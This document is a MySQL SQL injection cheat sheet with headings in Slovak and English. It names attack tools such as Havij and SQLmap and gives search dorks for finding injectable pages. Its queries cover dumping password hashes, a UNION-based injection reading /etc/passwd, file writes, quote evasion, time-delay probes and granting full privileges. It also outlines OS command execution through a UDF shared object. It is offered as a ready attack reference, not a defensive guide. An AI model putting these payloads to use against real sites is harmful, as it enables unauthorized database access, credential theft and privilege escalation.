-- GUI nástroje:
Havij 
TyrantSQL -- Treba Python 2.*.* + knižnice
SQL Power Injector
Vega

-- CMD nástroje:
SQLmap 
Hashcat

-- Vyhľadávacie dopyty Google/Bing:
PHP + MySQL
php?id=
asp?id=

-- SQLzoo hack
?answer=1

-- Verzia DB (Version DB)	
SELECT @@version

-- Komentáre (Comments)	
SELECT 1; #comment
SELECT /*comment*/1;

-- Aktuálny používateľ (Current User)	
SELECT user();
SELECT system_user();

-- Zoznam používateľov (List Users)
SELECT user FROM mysql.user; --  priv

-- Zoznam hashov hesiel (List Password Hashes)	
SELECT host, user, password FROM mysql.user; --  priv

-- Password Cracker	
-- HashCat, John the Ripper will crack MySQL password hashes

--  Zoznam oprávnení/privilégií (List Privileges)	
SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; --  list user privs
SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; --  priv, list user privs
SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; 

-- Zoznam oprávnení/privilégií na databáze (List privs on databases (schemas))
SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges; — list privs on columns

-- Zoznam DBA admin účtov List (DBA Accounts)	
SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; # priv

--  Názov aktuálne používanej/pripojenej databázy (Current Database)	
SELECT database()

-- Zoznam databáz (List Databases)	
SHOW databases;
SELECT schema_name FROM information_schema.schemata; — for MySQL >= v5.0
SELECT distinct(db) FROM mysql.db --  priv
List Columns	SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’

-- Zoznam tabuliek (List Tables)	
SHOW tables;
SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'

-- Nájdenie tabulky podľa názvu stĺpca (Find Tables From Column Name)	
SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username'; --  find table which have a column called 'username'

-- Výber ntého riadku (Select Nth Row)	
SELECT host, user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0
SELECT host, user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0

-- Výber ntého znaku (Select Nth Char)	
SELECT substr('abcd', 3, 1); # returns c

-- Bitový AND (Bitwise AND)	
SELECT 6 & 2; # returns 2
SELECT 6 & 1; # returns 0

-- ASCII hodnota (ASCII Value -> Char)	
SELECT char(65); # returns A
Char -> ASCII Value	SELECT ascii('A'); # returns 65

--  Pretypovanie (Casting)	
SELECT cast('1' AS unsigned integer);
SELECT cast('123' AS char);

--  Spajanie retazcov, zretazenie (String Concatenation)	
SELECT CONCAT('A','B'); #returns AB
SELECT CONCAT('A','B','C'); # returns ABC

-- Riadiaca štruktúra/príkaz IF (IF Statement)	
SELECT if(1=1,'foo','bar'); --  returns 'foo’

-- Riadiaca štruktúra/príkaz CASE (CASE Statement)	
SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END; # returns A

-- Vyhnutie sa úvodzovkám (Avoiding Quotes)	
SELECT 0×414243; # returns ABC

-- Oneskorenie (Time Delay)	
SELECT BENCHMARK(1000000,MD5('A'));
SELECT SLEEP(5); # >= 5.0.12

-- Výkonavanie príkazov (Command Execution)	
/* If mysqld (<5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar).  The .so file should contain a User Defined Function (UDF).  raptor_udf.c explains exactly how you go about this.  Remember to compile for the target architecture which may or may not be the same as your attack platform.
*/

-- Prístup k lokálne súboru (Local File Access)	
…’ UNION ALL SELECT LOAD_FILE('/etc/passwd') --  priv, can only read world-readable files.
SELECT * FROM mytable INTO dumpfile '/tmp/somefile'; --  priv, write to file system

-- Hostname, IP adresa, číslo portu (najčastejšie 3306-3309)(Hostname, IP Address, port)
SELECT @@hostname;
SHOW VARIABLES WHERE Variable_name = 'port'
SELECT SUBSTRING_INDEX(USER(), '@', -1) AS ip,  @@hostname as hostname, @@port as port, DATABASE() as current_database;
mysql> \s
mysql> status

-- Vytvorenie používateľa (Create Users)
CREATE USER test1 IDENTIFIED BY 'pass1'; --  priv

-- Vymazanie používateľa (Delete Users)	
DROP USER test1; --  priv

-- Sprav z používateľa admina (Make User DBA)	
GRANT ALL PRIVILEGES ON *.* TO test1@'%'; --  priv

-- Umiestnenie databázových súborov (Location of DB files)	
SELECT @@datadir;

-- Defaultná systémová databáza/schéma (Default/System Database) 
information_schema -- (>= mysql 5.0)
mysql